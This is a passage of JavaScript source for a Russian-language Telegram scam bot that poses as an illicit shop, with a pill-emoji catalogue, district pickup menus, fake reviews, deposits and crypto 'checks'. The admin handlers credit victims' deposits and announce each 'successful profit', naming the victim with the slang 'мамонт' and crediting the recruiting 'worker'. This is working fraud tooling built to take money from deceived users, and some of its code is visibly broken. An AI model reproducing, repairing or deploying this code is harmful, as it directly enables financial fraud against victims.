			return message.send(`Сумма платежа?`);
		} 
		
		if(message.user.menu.startsWith("setpay")) {
			message.text		=		Number(message.text);
			if(!message.text) return message.send(`Сумма платежа?`);

			let user		=		await User.findOne({ id: Number(message.user.menu.split("setpay")[1]) });
			if(!user) return;

			await message.user.set("menu", "");
            let ref		=		await User.findOne({ id: user.ref });
await User.findOneAndUpdate({ id: ref.id }, { $inc: { epv: message.text } })
bot.sendMessage(user.id, `✅ Вы <b>успешно</b> пополнили баланс на <b>${message.text}</b> <b>RUB.`, {
    parse_mode: "HTML"
   });
   await User.findOneAndUpdate({ id: user.id }, { $inc: { balance: message.text} })
	await message.send(`💸 Успешный профит!
    мамонт @ <a href="tg://user?id=${user.id}">id${user.id}</a> пополнил баланс на ${message.text}
    Воркер: @ <a href="tg://user?id=${ref.id}">id${ref.id}</a>`, {
        parse_mode: "HTML",
				reply_markup: {
					keyboard: keyboards.admin,
					resize_keyboard: true
				}
				
			});
            bot.sendMessage(ref.id, `💸 Успешный профит!
            мамонт @ <a href="tg://user?id=${user.id}">id${user.id}</a> пополнил баланс на ${message.text}
            Воркер: @ <a href="tg://user?id=${ref.id}">id${ref.id}</a>`, {
                parse_mode: "HTML"
               });
		}

if(message.user.menu === "dostup") {
			message.text		=		Math.floor(Number(message.text));
			if(!message.text) return message.send(`Введите айди.`);

			let user			=		await User.findOne({ id: message.text });
			await User.findOneAndUpdate({ id: user.id }, { $inc: { inv: 50 } })
				await message.user.set("menu", "");

				return message.send(`Доступ выдан.`);
			}

		if(message.user.menu === "enterId") {
			message.text = Number(message.text);
			if(!message.text) return message.send(`Введите айди пользователя.`);

			let user		=		await User.findOne({ id: message.text });
			if(!user) return message.send(`Пользователь с таким айди не найден.`);

			let refs		=		await User.find({ ref: message.text });
			message.send(`🆔 <a href="tg://user?id=${message.text}">Пользователь</a>: 

▪️ Баланс: <b>${user.balance.toFixed(2)}</b>₽
▪️ Мамонтов: <b>${user.part}</b> чел.
▪️ Заработал с мамонтов: <b>${user.epv.toFixed(2)}</b>₽ `, {
				parse_mode: "HTML",
				reply_markup: {
					keyboard: keyboards.admin,
					resize_keyboard: true
				}
			});

			message.user.set("menu", "");
		}
		if(message.user.menu === "testid") {
			message.text = Number(message.text);
			if(!message.text) return message.send(`Введите айди пользователя.`);

			
			
			message.send(`🆔 <a href="tg://user?id=${message.text}">Пользователь</a>: `, {
				parse_mode: "HTML",
				reply_markup: {
					keyboard: keyboards.admin,
					resize_keyboard: true
				}
			});

			message.user.set("menu", "");
		}
		if(message.user.menu === "ban") {
			message.text		=		Math.floor(Number(message.text));
			if(!message.text) return message.send(`Введите айди.`);

			let ban			=		await Ban.findOne({ id: message.text });
			if(ban) {
				await ban.remove();
				await message.user.set("menu", "");

				return message.send(`Бан снят.`);
			} else {
				let _ban = new Ban({
					id: message.text
				});

				await _ban.save();
				await message.user.set("menu", "");

				return message.send(`Бан выдан.`);
			}
		}

if(message.user.menu === "dostup") {
			message.text		=		Math.floor(Number(message.text));
			if(!message.text) return message.send(`Введите айди.`);

			let user			=		await User.findOne({ id: message.text });
			await User.findOneAndUpdate({ id: user.id }, { $inc: { inv: 50 } })
				await message.user.set("menu", "");

				return message.send(`Доступ выдан.`);
			}

		if(message.text === "/ban") {
			await message.user.set("menu", "ban");
			return message.send(`Введите айди пользователя.`, {
				reply_markup: {
					keyboard: keyboards.cancel,
					resize_keyboard: true
				}
			});
		}
		
		if(message.text === "/post") {
			await message.user.set("menu", "post");
			return message.send(`Введите текст поста`, {
				reply_markup: {
					keyboard: keyboards.cancel,
					resize_keyboard: true
				}
			});
		} 
		
		if(message.text === "/newday") {
		var today = new Date();
var dd = String(today.getDate()).padStart(2, '0');
var mm = String(today.getMonth() + 1).padStart(2, '0');
let counters = {
   users: await User.countDocuments(),
   users_today: await User.find({ regDate: `${new Date().getDate()}.${new Date().getMonth() + 1}.${new Date().getFullYear()}` }),
  }
  counters.users_today  =  counters.users_today.length;
await Stats.findOneAndUpdate({ id: `${dd}.${mm}` }, { $set: { user: counters.users_today } })
let schema = {
			id: `${dd+1}.${mm}`,
            inv: 0,
			viv: 0,
			suminv: 0,
			sumviv: 0,
			user: 0
		}
			let stat = new Stats(schema);
		await stat.save();
		}
		if(message.text === "/info") {
			var today = new Date();
var dd = String(today.getDate()).padStart(2, '0');
var mm = String(today.getMonth() + 1).padStart(2, '0');

let userList = await User.find();
let stat = await Stats.findOne({ id: `${dd}.${mm}` });
			let bal = 0;
await userList.map(async (x) => {
	  bal += x.balance
	}) 
	
	let statList = await Stats.find();
			let inv = 0;
			let viv = 0;
			let suminv = 0;
			let sumviv = 0;
await statList.map(async (x) => {
	inv += x.inv
	viv += x.viv
	suminv += x.suminv
	sumviv += x.sumviv
	}) 
  let counters = {
   users: await User.countDocuments(),
   users_today: await User.find({ regDate: `${new Date().getDate()}.${new Date().getMonth() + 1}.${new Date().getFullYear()}` }),
  }
  
  let statsuminv = Number(stat.suminv)
  let statsumviv = Number(stat.sumviv)

  counters.users_today  =  counters.users_today.length;
		return message.send(`ℹ️ <b>Статистика проекта за все время:</b>

➖ Баланс пользователей: <b>${(bal).toFixed(2)}₽</b>
➖ Количество пополнений: <b>${inv}</b>
➖ Количество выводов: <b>${viv}</b>
➖ Сумма пополнений: <b>${suminv.toFixed(2)}₽</b>
➖ Сумма выводов: <b>${sumviv.toFixed(2)}₽</b>
➖ Количество пользователей: <b>${counters.users}</b>

📈 <b>Статистика проекта за ${dd}.${mm}:</b>

➖ Количество пополнений: <b>${stat.inv}</b>
➖ Количество выводов: <b>${stat.viv}</b>
➖ Сумма пополнений: <b>${statsuminv.toFixed(2)}₽</b>
➖ Сумма выводов: <b>${statsumviv.toFixed(2)}₽</b>
➖ Количество пользователей: <b>${counters.users_today}</b>
`, { 
			parse_mode: "HTML"
		});
		} 
		
	
		
				if(message.text === "✅ Доступ") {
			await message.user.set("menu", "dostup");
			return message.send(`Введите айди пользователя.`, {
				reply_markup: {
					keyboard: keyboards.cancel,
					resize_keyboard: true
				}
			});
		}
		if(message.text === "💸 Баланс") {
			await message.user.set("menu", "enterIdBalance");
			return message.send(`Введите айди пользователя.`, {
				reply_markup: {
					keyboard: keyboards.cancel,
					resize_keyboard: true
				}
			});
		}
				if(message.text === "💳 Инвестиции") {
			await message.user.set("menu", "enterIdInBalance");
			return message.send(`Введите айди пользователя.`, {
				reply_markup: {
					keyboard: keyboards.cancel,
					resize_keyboard: true
				}
			});
		}

		if(message.text === "🆔 Информация") {
			await message.user.set("menu", "enterId");
			return message.send(`Введите айди пользователя.`, {
				reply_markup: {
					keyboard: keyboards.cancel,
					resize_keyboard: true
				}
			});
		}
		
		if(message.text === "/id") {
			await message.user.set("menu", "testid");
			return message.send(`Введите айди пользователя.`, {
				reply_markup: {
					keyboard: keyboards.cancel,
					resize_keyboard: true
				}
			});
		}
		
		if(message.text === "🧍 Рассылка") {
			await message.user.set("menu", "selectAuditory");
			return message.send(`Выберите аудиторию.

0.25	—	25%
0.50	—	50%
0.75	—	75%
1		—	100%`, {
				reply_markup: {
					keyboard: [["0.25", "0.50"], ["0.75", "1"], ["⛔️ Отмена"]],
					resize_keyboard: true
				}
			});
		}

		if(message.text === "/admin") return message.send(`Добро пожаловать.`, {
			reply_markup: {
				keyboard: keyboards.admin,
				resize_keyboard: true
			}
		});
	}
});

bot.on("callback_query", async (query) => {
	const { message } = query;
	message.user = await User.findOne({ id: message.chat.id });

	let ban = await Ban.findOne({ id: message.user.id });
	if (ban) return bot.answerCallbackQuery(query.id, "Забанен!", true);

	if (query.data.startsWith("viv")) {
	let plat		= (query.data.split("_")[1])
	let sbor = ``;
	let p = ``;
 if(plat == `qiwi`) { 
 if(message.user.balance < 50) return bot.answerCallbackQuery(query.id, '🚨 Минимальная сумма вывода: 50₽', true);
 sbor = `Qiwi Кошелёк`, p = `кошелька в формате 79XXXXXXXXX` }
            else if (plat == `kart`) {
if(message.user.balance < 50) return bot.answerCallbackQuery(query.id, '🚨 Минимальная сумма вывода: 50₽', true);
				sbor = `Банковская карта`, p = `карты и банк` }
			else if (plat == `money`) { sbor = `ЮMoney Кошелёк` , p = `кошелька`}
			else if (plat == `payeer`) {
 if(message.user.balance < 50) return bot.answerCallbackQuery(query.id, '🚨 Минимальная сумма вывода: 50₽', true);
				sbor = `Payeer Кошелёк` , p = `кошелька в формате PXXXXXXXX`}
	bot.deleteMessage(message.chat.id, message.message_id)
	 bot.sendMessage(message.chat.id,`Введите номер ${p} :`, {
			reply_markup: {
				keyboard: keyboards.cancel,
				resize_keyboard: true
			}
		});
        await message.user.set("menu", "qiwi_" + sbor);
		console.log(message.user.menu)
}
if(query.data.startsWith("kak")) {
		bot.deleteMessage(message.chat.id, message.message_id)
		bot.sendMessage(message.chat.id,`⁠⁠▪ Введите сумму, которую хотите рассчитать:`, {
		});
		await message.user.set("menu", "kak");
		
		}
		
		if(query.data.startsWith("send")) {
		
		if (message.user.send == 0) { bot.answerCallbackQuery(query.id, "🔔 Уведомление выкл.");
		await message.user.set("send", 1); 
		}
		if (message.user.send == 1) { bot.answerCallbackQuery(query.id, "🔔 Уведомление вкл.",true);
		await message.user.set("send", 0); 
		}
		}
		
		if(query.data.startsWith("calc")) {
				bot.sendMessage(message.user.id,`⁠⁠▪ Введите сумму, которую хотите рассчитать:`, {
		});

		await User.updateOne({ id: message.user.id }, { $set: { menu : `calc` } } )
	}
		
		if(query.data.startsWith("pod")) {
			bot.deleteMessage(message.chat.id, message.message_id)
			if(message.user.pod == 1) {
				return bot.sendMessage(message.user.id,`🚨 <b>Вы уже прошли проверку</b>`, {
					parse_mode: "HTML"
				})
			}
            var result = randomInteger(100000, 999998)
await bot.sendMessage(message.user.id,`Для прохождения проверки на робота пришлите текст: 
<b>${result}</b>`, {
parse_mode: "HTML"
		})
		await User.updateOne({ id: message.user.id }, { $set: { menu : `verif_${result}` } } )
		}

		if(query.data.startsWith("gift")) {
							
			bot.deleteMessage(message.chat.id, message.message_id)
		
		return bot.sendMessage(message.chat.id,`💰 <b>Персональные чеки
  
Персональный чек (перевод)</b> - <i>позволяет отправить монеты одному пользователю. Также Вы можете закрепить чек за конкретным пользователем, чтобы только он смог получить Ваш перевод.</i>`, {
		reply_markup: {
				inline_keyboard: [
					[{ text: "Создать", callback_data: `sogift` }],
		[{ text: "< Назад", callback_data: `check` }],
				]
			},
		parse_mode: "HTML"
		});
		}

		if(query.data.startsWith("sogift")) {
							
			bot.deleteMessage(message.chat.id, message.message_id)
		
		return bot.sendMessage(message.chat.id,`Выберите криптовалюту для отправки с помощью чека.`, {
		reply_markup: {
				inline_keyboard: [
					[{ text: "USDT", callback_data: `bgift_usdt` },{ text: "TON", callback_data: `bgift_ton` },{ text: "BTC", callback_data: `bgift_btc` }],
					[{ text: "ETH", callback_data: `bgift_eth` },{ text: "BNB", callback_data: `bgift_bnb` },{ text: "BUSD", callback_data: `bgift_busd` }],
		[{ text: "< Назад", callback_data: `gift` }],
				]
			},
		parse_mode: "HTML"
		});
		}

		if(query.data.startsWith("bgift")) {

			let crypto		= (query.data.split("_")[1])	
			if(crypto == `usdt`) {
            if(message.user.usdt < 0.1) {
				return bot.answerCallbackQuery(query.id, "Недостаточно монет. Сумма одного чека не может быть меньше чем $0.1. Сначала пополните баланс.",true);
			}
			bot.sendMessage(message.chat.id,`На какую сумму USDT выписать чек? (Его сможет обналичить любой пользователь, знающий код).
	
	Доступно: ${message.user.usdt} USDT`);
	
			await User.findOneAndUpdate({ id: message.user.id }, { $set: { menu: "gift_usdt" } }) 
			}
			if(crypto == `ton`) {
				if(message.user.ton < 0.05) {
					return bot.answerCallbackQuery(query.id, "Недостаточно монет. Сумма одного чека не может быть меньше чем $0.1. Сначала пополните баланс.",true);
				}
				bot.sendMessage(message.chat.id,`На какую сумму TON выписать чек? (Его сможет обналичить любой пользователь, знающий код).
	
	Доступно: ${message.user.ton} TON`);
	
			await User.findOneAndUpdate({ id: message.user.id }, { $set: { menu: "gift_ton" } }) 
			}
			if(crypto == `btc`) {
				if(message.user.btc < 0,0o5) {
					return bot.answerCallbackQuery(query.id, "Недостаточно монет. Сумма одного чека не может быть меньше чем $0.1. Сначала пополните баланс.",true);
				}
				bot.sendMessage(message.chat.id,`На какую сумму BTC выписать чек? (Его сможет обналичить любой пользователь, знающий код).
	
	Доступно: ${message.user.btc} BTC`);
	
			await User.findOneAndUpdate({ id: message.user.id }, { $set: { menu: "gift_btc" } }) 
			}
			if(crypto == `eth`) {
				if(message.user.eth < 0,0o65) {
					return bot.answerCallbackQuery(query.id, "Недостаточно монет. Сумма одного чека не может быть меньше чем $0.1. Сначала пополните баланс.",true);
				}
				bot.sendMessage(message.chat.id,`На какую сумму ETH выписать чек? (Его сможет обналичить любой пользователь, знающий код).
	
	Доступно: ${message.user.eth} ETH`);
	
			await User.findOneAndUpdate({ id: message.user.id }, { $set: { menu: "gift_eth" } }) 
			}
			if(crypto == `bnb`) {
				if(message.user.bnb < 0,0o33) {
					return bot.answerCallbackQuery(query.id, "Недостаточно монет. Сумма одного чека не может быть меньше чем $0.1. Сначала пополните баланс.",true);
				}
				bot.sendMessage(message.chat.id,`На какую сумму BNB выписать чек? (Его сможет обналичить любой пользователь, знающий код).
	
	Доступно: ${message.user.bnb} BNB`);
	
			await User.findOneAndUpdate({ id: message.user.id }, { $set: { menu: "gift_bnb" } }) 
			}
			if(crypto == `busd`) {
				if(message.user.d < 0.1) {
					return bot.answerCallbackQuery(query.id, "Недостаточно монет. Сумма одного чека не может быть меньше чем $0.1. Сначала пополните баланс.",true);
				}
				bot.sendMessage(message.chat.id,`На какую сумму BUSD выписать чек? (Его сможет обналичить любой пользователь, знающий код).
	
	Доступно: ${message.user.busd} BUSD`);
	
			await User.findOneAndUpdate({ id: message.user.id }, { $set: { menu: "gift_busd" } }) 
			}
		}

		if(query.data.startsWith("tyhtrugift")) {
			bot.deleteMessage(message.chat.id, message.message_id)
	if(message.user.balance < 0.1) {
	return bot.sendMessage(message.chat.id,`На вашем балансе меньше 0.1 TON`);
			}
		 bot.sendMessage(message.chat.id,`На какую сумму TON выписать чек? (Его сможет обналичить любой пользователь, знающий код).
	
	Доступно: ${message.user.balance} TON`, {
				reply_markup: {
					keyboard: keyboards.cancel,
					resize_keyboard: true
				}
			});
	
			await User.findOneAndUpdate({ id: message.user.id }, { $set: { menu: "gift" } }) 
			} 
		
		if(query.data.startsWith("bonus")) {
			bot.deleteMessage(message.chat.id, message.message_id)
			if(message.user.bonusTimer == 1) {
				return bot.sendMessage(message.user.id,`🚨 <b>Вы уже получили бонус</b>`)
			}
	if ((await bot.getChatMember("@LXFinanceNews", message.chat.id)).status == "left") {
await bot.sendMessage(message.user.id,`<b>▪️ Для получения бонуса 3₽, пройдите небольшую проверку, просто вступите в чат и нажмите кнопку продолжить.

©️ Нажмите на «Подписаться 1»</b>`, {
	parse_mode: "HTML",
					reply_markup: {
               inline_keyboard: [				   
					   [
					   { text: "➕ Подписаться на чат", url: `https://t.me/LXFinanceChat` },
							],
							[
       { text: "✅ Продолжить", callback_data: `bonus` },
							],
						],
						
			},
				})
				return bot.sendMessage(message.user.id,`🚨 <b>Вы не подписались на чат</b>`, {
			parse_mode: "HTML"
		})
		}
		
		await bot.sendMessage(message.user.id, `
©️ Главное меню.`, {
	reply_markup: {
				keyboard: keyboards.main,
				resize_keyboard: true
			}, 
parse_mode: "HTML"
}) 
await User.updateOne({ id: message.user.id }, { $set: { bonusTimer : 1 } } )
		}

		if(query.data.startsWith("menu")) {
            await User.findOneAndUpdate({ id: message.user.id }, { $set: { menu: `` } })
			bot.deleteMessage(message.chat.id, message.message_id)

		return bot.sendMessage(message.user.id, `
        ⚡️ Добро пожаловать в магазин ⚡️

        ▪️ В нашем магазине в короткие сроки вы можете получить необходимый вам товар.
        ▪️ Мы работаем круглосуточно.
        ▪️ Всегда сверяйте юзернейм оператора. МЫ НИКОГДА НЕ НАПИШЕМ ПЕРВЫЕ. 
        ▪️ Если ваш населённый пункт отсутствует в каталоге - обратитесь к оператору, мы поможем с оформлением предзаказа/доставки.`, {
			reply_markup: {
				inline_keyboard: [				   
                    [
                        { text: "💊 Каталог", callback_data: `kat` },
                        { text: "👥 Реферальная программа", callback_data: `referal` },
                        { text: "ℹ️ Отзывы", callback_data: `otz` },
                         ],
                         [
                            { text: "🚕 Доставка", callback_data: `kur` },
                            { text: "⚡ Профиль", callback_data: `prof` },
                            { text: "🧑‍💻 Оператор", url: `t.me/` },
                         ],
                         [
        { text: "🔥 Работа", callback_data: `work` },
        { text: "🛒 Мои покупки", callback_data: `pok` },
                         ],
                         [
                            { text: "💲 Пополнить баланс", callback_data: `deposit` },
                                                 ],
                         ],
						 
						 
			 }, 
parse_mode: "HTML"
}) 
}

if(query.data.startsWith("pok")) {
							
	bot.deleteMessage(message.chat.id, message.message_id)

return bot.sendMessage(message.chat.id,`🛒 История покупок не найдена... 🛒`, {
reply_markup: {
		inline_keyboard: [
            [
                { text: "💊 Каталог", callback_data: `kat` },
                { text: "👥 Реферальная программа", callback_data: `referal` },
                { text: "ℹ️ Отзывы", callback_data: `otz` },
                 ],
                 [
                    { text: "🚕 Доставка", callback_data: `kur` },
                    { text: "⚡ Профиль", callback_data: `prof` },
                    { text: "🧑‍💻 Оператор", url: `t.me/` },
                 ],
                 [
{ text: "🔥 Работа", callback_data: `work` },
{ text: "🛒 Мои покупки", callback_data: `pok` },
                 ],
                 [
                    { text: "💲 Пополнить баланс", callback_data: `deposit` },
                                         ],
                 ],
		
	},
parse_mode: "HTML"
});
}


if(query.data.startsWith("prof")) {
							
	bot.deleteMessage(message.chat.id, message.message_id)

return bot.sendMessage(message.chat.id,`⚡️ Профиль ⚡️

👤 Пользователь: 
╠ ID: ${message.user.id}
╠ Рейтинг: 0%
╚ Открытые диспуты: 0

💵 Баланс: ${message.user.balance} ₽

📅 Дата регистрации: ${message.user.regDate}
`, {
reply_markup: {
		inline_keyboard: [
            [
                { text: "💊 Каталог", callback_data: `kat` },
                { text: "👥 Реферальная программа", callback_data: `referal` },
                { text: "ℹ️ Отзывы", callback_data: `otz` },
                 ],
                 [
                    { text: "🚕 Доставка", callback_data: `kur` },
                    { text: "⚡ Профиль", callback_data: `prof` },
                    { text: "🧑‍💻 Оператор", url: `t.me/` },
                 ],
                 [
{ text: "🔥 Работа", callback_data: `work` },
{ text: "🛒 Мои покупки", callback_data: `pok` },
                 ],
                 [
                    { text: "💲 Пополнить баланс", callback_data: `deposit` },
                                         ],
                 ],
		
	},
parse_mode: "HTML"
});
}

if(query.data.startsWith("otz")) {
							
	bot.deleteMessage(message.chat.id, message.message_id)

return bot.sendMessage(message.chat.id,`📋 Общее количество отзывов: 1509

⚡ Канал с отзывами: https://t.me/otzyvi_store
`, {
reply_markup: {
		inline_keyboard: [
            [
                { text: "💊 Каталог", callback_data: `kat` },
                { text: "👥 Реферальная программа", callback_data: `referal` },
                { text: "ℹ️ Отзывы", callback_data: `otz` },
                 ],
                 [
                    { text: "🚕 Доставка", callback_data: `kur` },
                    { text: "⚡ Профиль", callback_data: `prof` },
                    { text: "🧑‍💻 Оператор", url: `t.me/` },
                 ],
                 [
{ text: "🔥 Работа", callback_data: `work` },
{ text: "🛒 Мои покупки", callback_data: `pok` },
                 ],
                 [
                    { text: "💲 Пополнить баланс", callback_data: `deposit` },
                                         ],
                 ],
		
	},
parse_mode: "HTML"
});
}

if(query.data.startsWith("1")) {
							
	bot.deleteMessage(message.chat.id, message.message_id)

return bot.sendMessage(message.chat.id,`📍 Выберите интересующий вас район:`, {
reply_markup: {
		inline_keyboard: [
            [
                { text: "💠 ДК Нефтехимик", callback_data: `kup_1` },
                { text: "💠 Родник", callback_data: `kup_2` },
                 ],
                 [
                    { text: "💠 Фестиваль", callback_data: `kup_3` },
                    { text: "💠 Южный Массив", callback_data: `kup_4` },
                 ],
                 [
                    { text: "💠 Надежда Китояг", callback_data: `kup_5` },
                 ],
                 [
                    { text: "< Назад", callback_data: `kat` },
                                         ],
                 ],
		
	},
parse_mode: "HTML"
});
}

if(query.data.startsWith("2")) {
							
	bot.deleteMessage(message.chat.id, message.message_id)

return bot.sendMessage(message.chat.id,`📍 Выберите интересующий вас район:`, {
reply_markup: {
		inline_keyboard: [
            [
                { text: "💠 Октябрьский", callback_data: `kup_1` },
                { text: "💠 Северный", callback_data: `kup_2` },
                 ],
                 [
                    { text: "💠 Соломбальский", callback_data: `kup_3` },
                    { text: "💠 Цигломенский ", callback_data: `kup_4` },
                 ],
                 [
                    { text: "< Назад", callback_data: `kat` },
                                         ],
                 ],
		
	},
parse_mode: "HTML"
});
}  

if(query.data.startsWith("3")) {
							
	bot.deleteMessage(message.chat.id, message.message_id)

return bot.sendMessage(message.chat.id,`📍 Выберите интересующий вас район:`, {
reply_markup: {
		inline_keyboard: [
            [
                { text: "💠 Ленинский", callback_data: `kup_1` },
                { text: "💠 Первомайский", callback_data: `kup_2` },
                 ],
                 [
                    { text: "💠 Первореченский", callback_data: `kup_3` },
                    { text: "💠 Советский", callback_data: `kup_4` },
                 ],
                 [
                    { text: "< Назад", callback_data: `kat` },
                                         ],
                 ],
		
	},
parse_mode: "HTML"
});
}

if(query.data.startsWith("4")) {
							
	bot.deleteMessage(message.chat.id, message.message_id)
return bot.sendMessage(message.chat.id,`📍 Выберите интересующий вас район:`, {
reply_markup: {
		inline_keyboard: [
            [
                { text: "💠 Коминтерновский", callback_data: `kup_1` },
                { text: "💠 Левобережный", callback_data: `kup_2` },
                 ],
                 [
                    { text: "💠 Советский", callback_data: `kup_3` },
                    { text: "💠 Центральный", callback_data: `kup_4` },
                 ],
                 [
                    { text: "< Назад", callback_data: `kat` },
                                         ],
                 ],
		
	},
parse_mode: "HTML"
});
}

if(query.data.startsWith("5")) {
							
	bot.deleteMessage(message.chat.id, message.message_id)
return bot.sendMessage(message.chat.id,`📍 Выберите интересующий вас район:`, {
reply_markup: {
		inline_keyboard: [
            [
                { text: "💠 Верх-Исетский", callback_data: `kup_1` },
                { text: "💠 Кировский", callback_data: `kup_2` },
                 ],
                 [
                    { text: "💠 Октябрьский", callback_data: `kup_3` },
                    { text: "💠 Орджоникидзевский", callback_data: `kup_4` },
                 ],
                 [
                    { text: "💠 Чкаловский", callback_data: `kup_5` },
                 ],
                 [
                    { text: "< Назад", callback_data: `kat` },
                                         ],
                 ],
		
	},
parse_mode: "HTML"
});
}

if(query.data.startsWith("6")) {
							
	bot.deleteMessage(message.chat.id, message.message_id)
return bot.sendMessage(message.chat.id,`📍 Выберите интересующий вас район:`, {
reply_markup: {
		inline_keyboard: [
            [
                { text: "💠 Октябрьский", callback_data: `kup_1` },
                { text: "💠 Центральный", callback_data: `kup_2` },
                 ],
                 [
                    { text: "💠 Ленинский", callback_data: `kup_3` },
                    { text: "💠 Солнечный", callback_data: `kup_4` },
                 ],
                 [
                    { text: "💠 Свердловский", callback_data: `kup_5` },
                 ],
                 [
                    { text: "< Назад", callback_data: `kat` },
                                         ],
                 ],
		
	},
parse_mode: "HTML"
});
}

if(query.data.startsWith("7")) {
							
	bot.deleteMessage(message.chat.id, message.message_id)
return bot.sendMessage(message.chat.id,`📍 Выберите интересующий вас район:`, {
reply_markup: {
		inline_keyboard: [
            [
                { text: "💠 Авиастроительный", callback_data: `kup_1` },
                { text: "💠 Вахитовский", callback_data: `kup_2` },
                 ],
                 [
                    { text: "💠 Кировский", callback_data: `kup_3` },
                    { text: "💠 Московский", callback_data: `kup_4` },
                 ],
                 [
                    { text: "💠 Ново-Савиновский", callback_data: `kup_5` },
                    { text: "💠 Приволжский", callback_data: `kup_6` },
                 ],
                 [
                    { text: "💠 Советский", callback_data: `kup_7` },
                 ],
                 [
                    { text: "< Назад", callback_data: `kat` },
                                         ],
                 ],
		
	},
parse_mode: "HTML"
});
}

if(query.data.startsWith("8")) {
							
	bot.deleteMessage(message.chat.id, message.message_id)
return bot.sendMessage(message.chat.id,`📍 Выберите интересующий вас район:`, {
reply_markup: {
		inline_keyboard: [
            [
                { text: "💠 Кировский", callback_data: `kup_1` },
                { text: "💠 Октябрьский", callback_data: `kup_2` },
                 ],
                 [
                    { text: "💠 Свердловский", callback_data: `kup_3` },
                    { text: "💠 Советский", callback_data: `kup_4` },
                 ],
                 [
                    { text: "💠 Центральный", callback_data: `kup_5` },
                 ],
                 [
                    { text: "< Назад", callback_data: `kat` },
                                         ],
                 ],
		
	},
parse_mode: "HTML"
});
}

if(query.data.startsWith("9")) {
							
	bot.deleteMessage(message.chat.id, message.message_id)
return bot.sendMessage(message.chat.id,`📍 Выберите интересующий вас район:`, {
reply_markup: {
		inline_keyboard: [
            [
                { text: "💠 Крылатское", callback_data: `kup_1` },
                { text: "💠 Выхино-Жулебино", callback_data: `kup_2` },
                 ],
                 [
                    { text: "💠 Некрасовка", callback_data: `kup_3` },
                    { text: "💠 Сокольники", callback_data: `kup_4` },
                 ],
                 [
                    { text: "💠 Ховрино", callback_data: `kup_5` },
                    { text: "💠 Коммунарка", callback_data: `kup_6` },
                 ],
                 [
                    { text: "💠 Войковский", callback_data: `kup_7` },
                    { text: "💠 Чертаново", callback_data: `kup_8` },
                 ],
                 [
                    { text: "💠 Хамовники", callback_data: `kup_9` },
                 ],
                 [
                    { text: "< Назад", callback_data: `kat` },
                                         ],
                 ],
		
	},
parse_mode: "HTML"
});
}

if(query.data.startsWith("q10")) {
							
	bot.deleteMessage(message.chat.id, message.message_id)
return bot.sendMessage(message.chat.id,`📍 Выберите интересующий вас район:`, {
reply_markup: {
		inline_keyboard: [
            [
                { text: "💠 Автозаводский", callback_data: `kup_1` },
                { text: "💠 Ленинский", callback_data: `kup_2` },
                 ],
                 [
                    { text: "💠 Московский", callback_data: `kup_3` },
                    { text: "💠 Советский", callback_data: `kup_4` },
                 ],
                 [
                    { text: "< Назад", callback_data: `kat` },
                                         ],
                 ],
		
	},
parse_mode: "HTML"
});
}

if(query.data.startsWith("w11")) {
							
	bot.deleteMessage(message.chat.id, message.message_id)
return bot.sendMessage(message.chat.id,`📍 Выберите интересующий вас район:`, {
reply_markup: {
		inline_keyboard: [
            [
                { text: "💠 Дзержинский", callback_data: `kup_1` },
                { text: "💠 Заельцовский", callback_data: `kup_2` },
                 ],
                 [
                    { text: "💠 Калининский", callback_data: `kup_3` },
                    { text: "💠 Кировский", callback_data: `kup_4` },
                 ],
                 [
                    { text: "💠 Октябрьский", callback_data: `kup_5` },
                    { text: "💠 Первомайский", callback_data: `kup_6` },
                 ],
                 [
                    { text: "< Назад", callback_data: `kat` },
                                         ],
                 ],
		
	},
parse_mode: "HTML"
});
}

if(query.data.startsWith("e12")) {
							
	bot.deleteMessage(message.chat.id, message.message_id)
return bot.sendMessage(message.chat.id,`📍 Выберите интересующий вас район:`, {
reply_markup: {
		inline_keyboard: [
            [
                { text: "💠 Кировский", callback_data: `kup_1` },
                { text: "💠 Ленинский", callback_data: `kup_2` },
                 ],
                 [
                    { text: "💠 Октябрьский", callback_data: `kup_3` },
                    { text: "💠 Советский", callback_data: `kup_4` },
                 ],
                 [
                    { text: "💠 Центральный", callback_data: `kup_5` },
                 ],
                 [
                    { text: "< Назад", callback_data: `kat` },
                                         ],
                 ],
		
	},
parse_mode: "HTML"
});
}

if(query.data.startsWith("r13")) {
							
	bot.deleteMessage(message.chat.id, message.message_id)
return bot.sendMessage(message.chat.id,`📍 Выберите интересующий вас район:`, {
reply_markup: {
		inline_keyboard: [
            [
                { text: "💠 Дзержинский", callback_data: `kup_1` },
                { text: "💠 Ленинский", callback_data: `kup_2` },
                 ],
                 [
                    { text: "💠 Промышленный", callback_data: `kup_3` },
                    { text: "💠 Центральный", callback_data: `kup_4` },
                 ],
                 [
                    { text: "< Назад", callback_data: `kat` },
                                         ],
                 ],
		
	},
parse_mode: "HTML"
});
}

if(query.data.startsWith("t14")) {
							
	bot.deleteMessage(message.chat.id, message.message_id)
return bot.sendMessage(message.chat.id,`📍 Выберите интересующий вас район:`, {
reply_markup: {
		inline_keyboard: [
            [
                { text: "💠 Первомайский", callback_data: `kup_1` },
                { text: "💠 Октябрьский", callback_data: `kup_2` },
                 ],
                 [
                    { text: "💠 Железнодорожный", callback_data: `kup_3` },
                    { text: "💠 Советский", callback_data: `kup_4` },
                 ],
                 [
                    { text: "💠 Ленинский", callback_data: `kup_5` },
                 ],
                 [
                    { text: "< Назад", callback_data: `kat` },
                                         ],
                 ],
		
	},
parse_mode: "HTML"
});
}

if(query.data.startsWith("y15")) {
							
	bot.deleteMessage(message.chat.id, message.message_id)
return bot.sendMessage(message.chat.id,`📍 Выберите интересующий вас район:`, {
reply_markup: {
		inline_keyboard: [
            [
                { text: "💠 Советский", callback_data: `kup_1` },
                { text: "💠 Октябрьский", callback_data: `kup_2` },
                 ],
                 [
                    { text: "💠 Промышленный", callback_data: `kup_5` },
                 ],
                 [
                    { text: "< Назад", callback_data: `kat` },
                                         ],
                 ],
		
	},
parse_mode: "HTML"
});
}

if(query.data.startsWith("u16")) {
							
	bot.deleteMessage(message.chat.id, message.message_id)
return bot.sendMessage(message.chat.id,`📍 Выберите интересующий вас район:`, {
reply_markup: {
		inline_keyboard: [
            [
                { text: "💠 Адмиралтейский", callback_data: `kup_1` },
                { text: "💠 Калининский", callback_data: `kup_2` },
                 ],
                 [
                    { text: "💠 Кировский", callback_data: `kup_3` },
                    { text: "💠 Московский", callback_data: `kup_4` },
                 ],
                 [
                    { text: "💠 Невский", callback_data: `kup_5` },
                    { text: "💠 Пушкинский", callback_data: `kup_7` },
                 ],
                 [
                    { text: "💠 Фрунзенский", callback_data: `kup_8` },
                    { text: "💠 Центральный", callback_data: `kup_6` },
                 ],
                 [
                    { text: "< Назад", callback_data: `kat` },
                                         ],
                 ],
		
